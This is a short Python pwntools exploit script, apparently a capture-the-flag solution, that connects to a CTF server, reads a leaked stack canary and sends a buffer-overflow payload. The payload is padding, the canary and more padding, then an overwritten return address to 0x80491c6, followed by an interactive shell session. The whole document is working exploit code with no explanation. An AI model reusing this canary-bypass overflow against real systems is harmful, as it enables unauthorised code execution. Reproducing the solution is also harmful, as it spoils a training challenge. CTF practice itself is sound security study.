from pwn import *

# p = process('./slightly-simple')
p = remote('pwn.ctf.unswsecurity.com', 7005)


p.recvuntil('hi\n')
canary = p.recvuntil('\n', drop=True)
print(canary)

canary = b'0x' + canary
canary = int(canary, 16)
print(hex(canary))

payload = b''
payload += b'A' * (0x20-0xC)
payload += p32(canary)
payload += b'A' * 0xC
payload += p32(0x80491c6)

pause()

p.sendline(payload)

p.interactive()